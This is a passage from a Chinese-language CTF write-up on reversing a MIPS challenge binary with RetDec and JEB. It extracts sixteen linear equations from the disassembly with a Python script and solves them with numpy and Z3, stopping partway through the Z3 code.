href="https://github.com/avast-tl/retdec" target="_blank" rel="noopener">https://github.com/avast-tl/retdec</a><br>· <strong>JEB-MIPS</strong>   <a href="https://www.pnfsoftware.com/jeb/demomips" target="_blank" rel="noopener">https://www.pnfsoftware.com/jeb/demomips</a></p><p>下面是三种找出算法的方法</p><h5 id="1-Retdec"><a href="#1-Retdec" class="headerlink" title="1.Retdec"></a>1.Retdec</h5><p>RetDec 是一个可重定向的机器码反编译器，它基于 LLVM，支持各种体系结构、操作系统和文件格式：<br>支持的文件格式：ELF，PE，Mach-O，COFF，AR（存档），Intel HEX 和原始机器码。<br>支持的体系结构（仅限 32 位）：Intel x86，ARM，MIPS，PIC32 和 PowerPC。</p><p>安装和使用方法GitHub上都写了<br>或者这里有一个很好的简易介绍  <a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/5.11.1_retdec.html" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/5.11.1_retdec.html</a></p><p>我在win10安装之后，把patch放到了D盘根目录，Retdec文件夹也是，然后在cmd中执行<br><code>D:\retdec\bin\decompile.sh D:\patch</code><br>等待分析(因为我装了Git，就自动调用Git bash执行了，其他情况还没试过)<br>结束后D盘生成下面几个文件<br><a href="https://i.loli.net/2018/07/16/5b4c618ec9bd3.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c618ec9bd3.jpg" class="lazyload"></a><br>打开patch.c，看sub_400420<br>我的不知道出了什么问题，分析不了，直接return 1。。。感觉应该是把函数分解了</p><p><a href="https://i.loli.net/2018/07/16/5b4c618ee2755.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c618ee2755.jpg" class="lazyload"></a></p><p>借用一下‘niuwuwu’的图<br><a href="https://i.loli.net/2018/07/16/5b4c618f05c61.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c618f05c61.jpg" class="lazyload"></a></p><p>是16个方程求解，解方程下面说，接下来用JEB反编译</p><h5 id="2-JEB-MIPS"><a href="#2-JEB-MIPS" class="headerlink" title="2.JEB-MIPS"></a>2.JEB-MIPS</h5><p>先到官网下载试用版的JEB，试用版功能是完整版的百分之九十，所以其实足够学习用了(国外友人客服也非常专业且友好)</p><p>解压后有三个运行脚本，分别是Windows，Linux和Mac OS的，我为了方便就装Ubuntu了</p><p><strong>不管是哪个系统，我们都需要JAVA8的环境</strong></p><p>Ubuntu安装JAVA8<br><code>sudo apt-get install openjdk-8-jdk</code><br>查看java版本，看看是否安装成功<br><code>java -version</code></p><p>成功后运行脚本，就打开主程序了，导入patch程序，找到00400420<br><a href="https://i.loli.net/2018/07/16/5b4c618f29f4e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c618f29f4e.jpg" class="lazyload"></a><br>右键，Decompile<br><a href="https://i.loli.net/2018/07/16/5b4c618f4427c.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c618f4427c.jpg" class="lazyload"></a><br>很长很长的算式，就是16个方程了</p><h4 id="2-手工分析清洗方程"><a href="#2-手工分析清洗方程" class="headerlink" title="2.手工分析清洗方程"></a>2.手工分析清洗方程</h4><p>(来自‘奈沙夜影’)</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f &#x3D; open(&quot;code.txt&quot;, &quot;r&quot;)</span><br><span class="line">flower &#x3D; [&quot;slti&quot;, &quot;sdc1&quot;]</span><br><span class="line">a0 &#x3D; 0x76ff270</span><br><span class="line">v0 &#x3D; 0xd0000</span><br><span class="line">v1 &#x3D; 8</span><br><span class="line">fp &#x3D; [0 for i in range(0x500)]</span><br><span class="line">table &#x3D; [0x0, 0x42d1f0, 0x0, 0x42d1f0,</span><br><span class="line">0xa, 0xa, 0x0, 0x9,</span><br><span class="line">0x4250bc, 0x9, 0x426630, 0x42d1f0,</span><br><span class="line">0x40a3ec, 0x37343431, 0x363434, 0x0,</span><br><span class="line">0x0, 0x42d1f0, 0x0, 0x4250bc,</span><br><span class="line">0x0, 0x0, 0x425060, 0x42d1f0,</span><br><span class="line">0x403ad0, 0x0, 0x0, 0x1000,</span><br><span class="line">0x425088, 0x76fff184, 0x412fcd, 0x1,</span><br><span class="line">0x410570, 0x425190, 0x40ca48, 0x0,</span><br><span class="line">0x0, 0x42d1f0, 0x0, 0x42d1f0,</span><br><span class="line">0x425088, 0xffffffff, 0x4106c4, 0xffffffff,</span><br><span class="line">0x76fff184, 0x412fcd, 0x1, 0x42d1f0,</span><br><span class="line">0x0, 0x425088, 0x40ccac, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x42d1f0,</span><br><span class="line">0x0, 0x425190, 0x76ffeef8, 0x425190,</span><br><span class="line">0x10, 0x425088, 0x40baac, 0x42d1f0,</span><br><span class="line">0x412fcd, 0x1, 0x425088, 0x40baac,</span><br><span class="line">0x76fff184, 0x412fce, 0x40b684, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x42d1f0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x42d1f0, 0x0, 0x42d1f0,</span><br><span class="line">0x0, 0x4250bc, 0x413081, 0x9,</span><br><span class="line">0x403f24, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x42d1f0,</span><br><span class="line">0x0, 0x413078, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0xd0000, 0xf1f4,</span><br><span class="line">0xcf8, 0xf5f1, 0x7883, 0xe2c6,</span><br><span class="line">0x67, 0xeccc, 0xc630, 0xba2e,</span><br><span class="line">0x6e41, 0x641d, 0x716d, 0x4505,</span><br><span class="line">0x76fff224, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0xfffffffe, 0x0,</span><br><span class="line">0x76fff2ac, 0x412fcd, 0x1, 0x0,</span><br><span class="line">0x6, 0x7fffffff, 0x1, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0xa, 0xa, 0x425088, 0x8,</span><br><span class="line">0x7ffffff8, 0x100, 0x413f38, 0x1,</span><br><span class="line">0x413f38, 0x0, 0x2, 0x76fff0f8,</span><br><span class="line">0x0, 0x0, 0x7fffffff, 0x76fff220,</span><br><span class="line">0x405050, 0x550001, 0x0, 0x425000,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x76fff220,</span><br><span class="line">0x404d84, 0x42d1f0, 0x0, 0x500,</span><br><span class="line">0x5, 0x42d1f0, 0xb3b, 0x76fff224,</span><br><span class="line">0x115, 0x1a131100, 0x76fff220, 0x76fff270,</span><br><span class="line">0x76fff2ac, 0xffbecf88, 0xa, 0x405880]</span><br><span class="line">j &#x3D; 0</span><br><span class="line">functions &#x3D; 0</span><br><span class="line">for i in range(0xb4, 0x410, 4):</span><br><span class="line">    fp[i] &#x3D; table[j]</span><br><span class="line">    j +&#x3D; 1</span><br><span class="line">input &#x3D; [int(str(i)*3, 16) for i in range(16)]</span><br><span class="line">try:</span><br><span class="line">    while(True):</span><br><span class="line">        code &#x3D; f.readline()</span><br><span class="line">        if(code &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(&quot;finish&quot;)</span><br><span class="line">            break</span><br><span class="line">        if(code[:3] &#x3D;&#x3D; &quot;loc&quot;):</span><br><span class="line">            # print(&quot;\n[s]:\t&quot; + code[:-1])</span><br><span class="line">            continue</span><br><span class="line">        if(code.find(&quot;nop&quot;)!&#x3D;-1):</span><br><span class="line">            continue</span><br><span class="line">        code &#x3D; code.split(&quot;$&quot;)</span><br><span class="line">        # print(code)</span><br><span class="line"></span><br><span class="line">        c &#x3D; code[0].strip()</span><br><span class="line"></span><br><span class="line">        if(c&#x3D;&#x3D;&quot;sw&quot;):</span><br><span class="line">            n1 &#x3D; code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 &#x3D; 0x410 - int(&quot;0x&quot; + code[1].split(&quot;_&quot;)[1].split(&quot;(&quot;)[0], 16)</span><br><span class="line">            code &#x3D; (&quot;fp[&quot; + hex(n2) + &quot;] &#x3D; &quot; + n1)</span><br><span class="line">        elif(c&#x3D;&#x3D;&quot;li&quot;):</span><br><span class="line">            n1 &#x3D; code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 &#x3D; code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code &#x3D; (n1 + &quot; &#x3D; &quot; + n2)</span><br><span class="line">        elif(c&#x3D;&#x3D;&quot;lw&quot;):</span><br><span class="line">            n1 &#x3D; code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            if(&quot;&quot;.join(code).find(&quot;fp&quot;)!&#x3D;-1):</span><br><span class="line">                n2 &#x3D; 0x410 - int(&quot;0x&quot; + code[1].split(&quot;_&quot;)[1].split(&quot;(&quot;)[0], 16)</span><br><span class="line">                code &#x3D; (n1 + &quot; &#x3D; fp[&quot; + hex(n2) + &quot;]&quot;)</span><br><span class="line">                # print(&quot;# &quot; + hex(fp[n2]))</span><br><span class="line">                #输出方程</span><br><span class="line">                print(&quot;0x%x*&quot;%fp[n2],end&#x3D;&#39;&#39;)</span><br><span class="line">            else:</span><br><span class="line">                # print(&quot;[c]:\t&quot; + &quot;&quot;.join(code)[:-1], &quot;v0&#x3D;%x&quot;%v0)</span><br><span class="line">                n2 &#x3D; ((v0) + int(code[1].split(&quot;,&quot;)[1].replace(&quot;(&quot;, &quot;&quot;)))&#x2F;&#x2F;4</span><br><span class="line">                code &#x3D; (n1 + &quot; &#x3D; input[&quot; + str(n2) + &quot;]&quot;)</span><br><span class="line">                print(&quot;a[%d]&quot;%n2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                # print(code)</span><br><span class="line">                # print(hex(v0))</span><br><span class="line">                # break</span><br><span class="line">        elif(c&#x3D;&#x3D;&quot;sll&quot;):</span><br><span class="line">            n1 &#x3D; code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 &#x3D; code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code &#x3D; (n1 + &quot; &#x3D; &quot; + n1 + &quot;&lt;&lt;&quot; + n2)</span><br><span class="line">        elif(c&#x3D;&#x3D;&quot;sra&quot;):</span><br><span class="line">            n1 &#x3D; code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 &#x3D; code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code &#x3D; (n1 + &quot; &#x3D; &quot; + n1 + &quot;&gt;&gt;&quot; + n2)</span><br><span class="line">        elif(c&#x3D;&#x3D;&quot;xori&quot;):</span><br><span class="line">            n1 &#x3D; code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 &#x3D; code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code &#x3D; (n1 + &quot; &#x3D; &quot; + n1 + &quot;^&quot; + n2)</span><br><span class="line">        elif(c&#x3D;&#x3D;&quot;addiu&quot;):</span><br><span class="line">            n1 &#x3D; code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 &#x3D; code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code &#x3D; (n1 + &quot; &#x3D; &quot; + n1 + &quot;+&quot; + n2)</span><br><span class="line">            # print(&quot;+&quot;)</span><br><span class="line">        elif(c&#x3D;&#x3D;&quot;mul&quot;):</span><br><span class="line">            n1 &#x3D; code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 &#x3D; code[2].split(&quot;,&quot;)[0].strip()</span><br><span class="line">            n3 &#x3D; code[3].strip()</span><br><span class="line">            code &#x3D; (n1 + &quot; &#x3D; &quot; + n2 + &quot;*&quot; + n3)</span><br><span class="line">        elif(c&#x3D;&#x3D;&quot;addu&quot;):</span><br><span class="line">            n1 &#x3D; code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 &#x3D; code[2].split(&quot;,&quot;)[0].strip()</span><br><span class="line">            code &#x3D; (n1 + &quot; &#x3D; &quot; + n1 + &quot;+&quot; + n2)</span><br><span class="line">            print(&quot;+&quot;)</span><br><span class="line">        elif(c&#x3D;&#x3D;&quot;subu&quot;):</span><br><span class="line">            n1 &#x3D; code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 &#x3D; code[2].split(&quot;,&quot;)[0].strip()</span><br><span class="line">            code &#x3D; (n1 + &quot; &#x3D; &quot; + n1 + &quot;-&quot; + n2)</span><br><span class="line">            print(&quot;-&quot;)</span><br><span class="line">        elif(c&#x3D;&#x3D;&quot;beq&quot;):</span><br><span class="line">            print(&quot;&#x3D;0x%x&quot;%(v0))</span><br><span class="line">            print(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;one function&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;)</span><br><span class="line">            functions +&#x3D;1</span><br><span class="line">            continue</span><br><span class="line">        elif(c&#x3D;&#x3D;&quot;negu&quot;):</span><br><span class="line">            n1 &#x3D; code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 &#x3D; code[2].split(&quot;,&quot;)[0].strip()</span><br><span class="line">            code &#x3D; (n1 + &quot; &#x3D; &quot; + &quot;-&quot; + n2)</span><br><span class="line">            print(&quot;-&quot;)</span><br><span class="line">        elif(c&#x3D;&#x3D;&quot;nop&quot;):</span><br><span class="line">            continue</span><br><span class="line">        elif(c&#x3D;&#x3D;&quot;lui&quot;):</span><br><span class="line">            n1 &#x3D; code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 &#x3D; code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code &#x3D; (n1 + &quot; &#x3D; &quot; + n2 + &quot;&lt;&lt;32&quot;)</span><br><span class="line">        elif(c&#x3D;&#x3D;&quot;move&quot; or c&#x3D;&#x3D;&quot;and&quot;):</span><br><span class="line">            continue</span><br><span class="line">        elif(c in flower):</span><br><span class="line">            # print(&quot;[f]:\t&quot; + &quot;&quot;.join(code)[:-1])</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            print(&quot;[x]:\tFind unknown code | &quot; + &quot;&quot;.join(code))</span><br><span class="line">            break</span><br><span class="line">        # print(&quot;[-]:\t&quot; + code)</span><br><span class="line">        exec(code)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(repr(e))</span><br><span class="line">    print(code)</span><br><span class="line">print(functions)</span><br><span class="line"># print(fp)</span><br></pre></td></tr></table></figure></div><h3 id="解方程"><a href="#解方程" class="headerlink" title="解方程"></a>解方程</h3><p>解方程的方法很多<br>比如Python的有</p><blockquote><p>Numpy 求解线性方程组<br>SciPy 求解非线性方程组<br>SymPy</p></blockquote><p>上面三个有个链接可以参照<a href="https://zhuanlan.zhihu.com/p/24893371" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/24893371</a></p><h4 id="numpy求解"><a href="#numpy求解" class="headerlink" title="numpy求解"></a>numpy求解</h4><p>来自‘niuwuwu’</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">from scipy.linalg import solve</span><br><span class="line">A&#x3D;[</span><br><span class="line">    [-56251,64497,-61787,29993,-16853,2147,-51990,-36278,-34108,-1148,1798,-43452,-16150,-56087,-17677,-41752],</span><br><span class="line">    [-39354,63754,50513,2396,-37448,43585,19468,-4688,-62869,-20663,41173,61113,30862,38224,-601,53899],</span><br><span class="line">    [26798,-58888,14929,-21751,-12385,55961,-20714,24897,40045,9805,25147,39173,-21952,-42840,37937,-8559],</span><br><span class="line">    [-2789,53359,16747,54195,-30020,39916,-32582,60338,13971,27307,-30484,47826,37554,64914,-1745,27669],</span><br><span class="line">    [40374,6523,13380,-53413,-1194,7796,-31815,-51866,-40252,-56883,57811,23278,-5785,61525,-6984,-7335],</span><br><span class="line">    [-57052,-64573,-62351,2628,21493,12939,-60006,435,15009,-4091,22743,4901,48803,-43203,5263,-32994],</span><br><span class="line">    [54760,41053,22537,-56473,46316,19787,-40180,2088,2044,26575,-5207,31098,-23838,21642,46750,13706],</span><br><span class="line">    [-40176,-43382,48718,-25423,21452,-36714,-24119,-13231,-52192,49742,54709,-32636,20233,21460,48733,15155],</span><br><span class="line">    [38446,-880,-2443,50487,-46973,-56178,-37138,-9079,-19096,-60988,-1823,-21538,43896,-4141,-19370,-47796],</span><br><span class="line">    [5176,18400,-53852,36119,-32120,47724,17154,5390,-29717,14471,8755,1432,-45518,-8148,-56623,-48254],</span><br><span class="line">    [30203,-50712,-27560,-16075,3618,590,44305,20581,33442,-7743,-43075,-16234,45723,-44899,42321,49264],</span><br><span class="line">    [42705,-32299,-19156,5594,28870,8059,58103,-60723,-32112,-7128,45985,-24915,63910,18427,-51408,22619],</span><br><span class="line">    [-57517,20738,-32286,55995,26666,37550,-51489,13733,32455,-2897,-39622,-54523,50733,-24649,-17849,-62326],</span><br><span class="line">    [-15716,-38264,64476,-37524,-61551,13536,12920,1407,-63767,-55105,-46543,-36562,-20712,2063,-6668,9074],</span><br><span class="line">    [47490,18611,52416,3107,32177,-41780,11008,7223,5652,881,26719,-28444,46077,-272,-32475,-9432],</span><br><span class="line">    [-58938,-35689,35708,44689,45902,36614,38550,731,49990,6727,61526,-35587,-39199,-43886,-56409,-25519],</span><br><span class="line">]</span><br><span class="line">B&#x3D;[-24232262,17175305,8705731,26962228,-6384428,-15459013,19554563,-188243,-19590071,-12754495,6442406,-2869966,-4805280,-18964176,8938201,3896470]</span><br><span class="line"></span><br><span class="line">a &#x3D; np.array(A)</span><br><span class="line">b &#x3D; np.array(B)</span><br><span class="line">x &#x3D;solve(a,b)</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure></div><hr><p>来自‘ljt1000’</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">A  &#x3D; &quot;-15858,-48466,32599,38605,-44159,23939,45662,9287,47754,47937,41896,51986,-26968,22561,30701,63487;&quot;</span><br><span class="line">A +&#x3D; &quot;60228,-3993,-16615,57134,-19246,-38581,40294,-44968,-28198,-58965,-39534,22458,-8828,48593,46135,23871;&quot;</span><br><span class="line">A +&#x3D; &quot;59121,42162,-65140,-3847,-23842,-47173,-39252,37804,-20964,-19217,56467,5112,9324,61729,61599,3578;&quot;</span><br><span class="line">A +&#x3D; &quot;-36731,-26147,1670,19245,26847,39911,8628,57946,-51207,63125,-21537,-9321,40745,-58129,30962,-27610;&quot;</span><br><span class="line">A +&#x3D; &quot;-63560,-53320,-34289,61060,-14289,46922,53218,36638,-61969,-33727,-4681,32423,-17044,-46689,-35443,-24156;&quot;</span><br><span class="line">A +&#x3D; &quot;-10571,-11103,51585,-24771,63730,57047,-63227,4227,-56470,-22654,-46325,62842,22480,59412,24937,62085;&quot;</span><br><span class="line">A +&#x3D; &quot;52617,-54333,61495,33704,-41733,-44527,51882,-61765,-24691,-10103,31055,61454,-59349,9812,-48848,-47279;&quot;</span><br><span class="line">A +&#x3D; &quot;-40696,-26470,54670,-23715,10008,7723,-62622,53112,31753,-5047,-48878,-58448,19875,-34944,-22161,35800;&quot;</span><br><span class="line">A +&#x3D; &quot;-23196,-43354,-58947,3384,-2426,-60194,51907,-20177,-31882,61703,42398,-4627,45749,-29203,-11139,-41301;&quot;</span><br><span class="line">A +&#x3D; &quot;-37819,-10066,-48579,-62613,-28961,40001,-37989,-27875,-20264,-33616,-5998,30740,-29594,21652,5165,51797;&quot;</span><br><span class="line">A +&#x3D; &quot;52993,62328,4196,-55719,-1917,28075,-44831,-15799,13652,-52110,-38933,62219,40030,-23815,-19505,60128;&quot;</span><br><span class="line">A +&#x3D; &quot;35796,-28033,-59250,46833,39767,-22909,5585,-42334,64787,6068,60536,-54554,22189,-49945,40846,64023;&quot;</span><br><span class="line">A +&#x3D; &quot;-18536,-35823,4253,-63956,20175,43158,30523,28298,-29564,18809,50821,-38574,3005,33408,58281,-29452;&quot;</span><br><span class="line">A +&#x3D; &quot;2848,39836,46250,24950,38512,31901,-21506,-36050,44162,41717,-36605,-26097,-38073,36024,7349,19105;&quot;</span><br><span class="line">A +&#x3D; &quot;22525,15747,63301,42436,-26106,-22761,48830,6176,-55225,-45599,-30368,50701,5775,10902,12758,-19336;&quot;</span><br><span class="line">A +&#x3D; &quot;-58450,-51156,-5460,32490,-26701,27355,34100,-14902,10736,54258,-9189,-25920,48339,-61339,61403,-30542&quot;</span><br><span class="line"></span><br><span class="line">b &#x3D; &quot;23261386,-1298872,13877344,9172342,-11622989,10343966,-9721165,-8286458,-7515929,-12609498,2179053,11137244,12446496,10255605,854242,1542147&quot;</span><br><span class="line"></span><br><span class="line">A &#x3D; np.mat(A)</span><br><span class="line">b &#x3D; np.mat(b).T</span><br><span class="line">r &#x3D; np.linalg.solve(A,b)</span><br><span class="line">print r</span><br></pre></td></tr></table></figure></div><h4 id="Z3约束器求解方程"><a href="#Z3约束器求解方程" class="headerlink" title="Z3约束器求解方程"></a>Z3约束器求解方程</h4><p>Z3可以说很出名了<br>这里有个教程<a href="http://ericpony.github.io/z3py-tutorial/guide-examples.htm" target="_blank" rel="noopener">http://ericpony.github.io/z3py-tutorial/guide-examples.htm</a></p><p>来自‘奈沙夜影’</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">a &#x3D; [BitVec(&quot;a%d&quot;%i, 32) for i in range(16)]</span><br><span class="line">s &#x3D; Solver()</span><br><span class="line">s.add(0xca6a*a[0] -0xd9ee*a[1] +0xc5a7*a[2] +0x19ee*a[3] +0xb223*a[4] +0x42e4*a[5] +0xc112*a[6] -0xcf45*a[7] +0x260d*a[8] +0xd78d*a[9] +0x99cb*a[10] -0x3e58*a[11] -0x97cb*a[12] +0xfba9*a[13] -0xdc28*a[14] +0x859b*a[15]  &#x3D;&#x3D; 0xaa2ed7)</span><br><span class="line">s.add(0xf47d*a[0] +0x12d3*a[1] -0x4102*a[2] +0xcedf*a[3] -0xafcf*a[4] -0xeb20*a[5] -0x2065*a[6] +0x36d2*a[7] -0x30fc*a[8] -0x7e5c*a[9] +0xeea8*a[10] +0xd8dd*a[11] -0xae2*a[12] +0xc053*a[13] +0x5158*a[14] -0x8d42*a[15]  &#x3D;&#x3D; 0x69d32e)</span><br><span class="line">s.add(0xffff52cf*a[0] -0x4fea*a[1] +0x2075*a[2] +0x9941*a[3] -0xbd78*a[4] +0x9e58*a[5] +0x40ad*a[6] -0x8637*a[7] -0x2e08*a[8] +0x4414*a[9] +0x2748*a[10] +0x1773*a[11] +0xe414*a[12] -0x7b19*a[13] +0x6b71*a[14] -0x3dcf*a[15]  &#x3D;&#x3D; 0x3b89d9)</span><br><span class="line">s.add(0xffffedd7*a[0] -0x1df0*a[1] +0x8115*a[2] +0x54bd*a[3] -0xf2ba*a[4] +0xdbd*a[5] +0x1dcf*a[6] +0x272*a[7] -0x2fcc*a[8] -0x93d8*a[9] -0x6f6c*a[10] -0x98ff*a[11] +0x2148*a[12] -0x6be2*a[13] +0x2e56*a[14] -0x7bdf*a[15]  &#x3D;&#x3D; 0xff6a5aea)</span><br><span class="line">s.add(0xffffa8c1*a[0] +0xdc78*a[1] -0x380f*a[2] +0x33c0*a[3] -0x7252*a[4] -0xe5a9*a[5] +0x7a53*a[6] -0x4082*a[7] -0x584a*a[8] +0xc8db*a[9] +0xd941*a[10] +0x6806*a[11] -0x8b97*a[12] +0x23d4*a[13] +0xac2a*a[14] +0x20ad*a[15]  &#x3D;&#x3D; 0x953584)</span><br><span class="line">s.add(0x5bb7*a[0] -0xfdb2*a[1] +0xaaa5*a[2] -0x50a2*a[3] -0xa318*a[4] +0xbcba*a[5] -0x5e5a*a[6] +0xf650*a[7] +0x4ab6*a[8] -0x7e3a*a[9] -0x660c*a[10] +0xaed9*a[11] -0xa60f*a[12] +0xf924*a[13] -0xff1d*a[14] +0xc888*a[15]  &#x3D;&#x3D; 0xffd31341)</span><br><span class="line">s.add(0x812d*a[0] -0x402c*a[1] +0xaa99*a[2] -0x33b*a[3] +0x311b*a[4] -0xc0d1*a[5] -0xfad*a[6] -0xc1bf*a[7] -0x1560*a[8] -0x445b*a[9] -0x9b78*a[10] +0x3b94*a[11] +0x2531*a[12] -0xfb03*a[13] +0x8*a[14] +0x8721*a[15]  &#x3D;&#x3D; 0xff9a6b57)</span><br><span class="line">s.add(0x15c5*a[0] +0xb128*a[1] -0x957d*a[2] +0xdf80*a[3] +0xee68*a[4] -0x3483*a[5] -0x4b39*a[6] -0x3807*a[7] -0x4f77*a[8] +0x652f*a[9] -0x686f*a[10] -0x7fc1*a[11] -0x5d2b*a[12] -0xb326*a[13] -0xacde*a[14] +0x1f11*a[15]  &#x3D;&#x3D; 0xffd6b3d3)</span><br><span class="line">s.add(0xaf37*a[0] +0x709*a[1] +0x4a95*a[2] -0xa445*a[3] -0x4c32*a[4] -0x6e5c*a[5] -0x45a6*a[6] +0xb989*a[7] +0xf5b7*a[8] +0x3980*a[9] -0x151d*a[10] +0xaf13*a[11] +0xa134*a[12] +0x67ff*a[13] +0xce*a[14] +0x79cf*a[15]  &#x3D;&#x3D; 0xc6ea77)</span><br><span class="line">s.add(0xffff262a*a[0] +0xdf05*a[1] -0x148e*a[2] -0x4758*a[3] -0xc6b2*a[4] -0x4f94*a[5] -0xf1f4*a[6] +0xcf8*a[7] +0xf5f1*a[8] -0x7883*a[9] -0xe2c6*a[10] -0x67*a[11] +0xeccc*a[12] -0xc630*a[13] -0xba2e*a[14] -0x6e41*a[15]  &#x3D;&#x3D; 0xff1daae5)</span><br><span class="line">s.add(0xffff9be3*a[0] -0x716d*a[1] +0x4505*a[2] -0xb99d*a[3] +0x1f00*a[4] +0x72bc*a[5] -0x7ff*a[6] +0x8945*a[7] -0xcc33*a[8] -0xab8f*a[9] +0xde9e*a[10] -0x6b69*a[11] -0x6380*a[12] +0x8cee*a[13] -0x7a60*a[14] +0xbd39*a[15]  &#x3D;&#x3D; 0xff5be0b4)</span><br><span class="line">s.add(0x245e*a[0] +0xf2c4*a[1] -0xeb20*a[2] -0x31d8*a[3] -0xe329*a[4] +0xa35a*a[5] +0xaacb*a[6] +0xe24d*a[7] +0xeb33*a[8] +0xcb45*a[9] -0xdf3a*a[10] +0x27a1*a[11] +0xb775*a[12] +0x713e*a[13] +0x5946*a[14] +0xac8e*a[15]  &#x3D;&#x3D; 0x144313b)</span><br><span class="line">s.add(0x157*a[0] -0x5f9c*a[1] -0xf1e6*a[2] +0x550*a[3] -0x441b*a[4] +0x9648*a[5] +0x8a8f*a[6] +0x7d23*a[7] -0xe1b2*a[8] -0x5a46*a[9] -0x5461*a[10] +0xee5f*a[11] -0x47e6*a[12] +0xa1bf*a[13] +0x6cf0*a[14] -0x746b*a[15]  &#x3D;&#x3D; 0xffd18bd2)</span><br><span class="line">s.add(0xf81b*a[0] -0x76cb*a[1] +0x543d*a[2] -0x4a85*a[3] +0x1468*a[4] +0xd95a*a[5] +0xfbb1*a[6] +0x6275*a[7] +0x30c4*a[8] -0x9595*a[9] -0xdbff*a[10] +0x1d1d*a[11] +0xb1cf*a[12] -0xa261*a[13] +0xf38e*a[14] +0x895c*a[15]  &#x3D;&#x3D; 0xb5cb52)</span><br><span 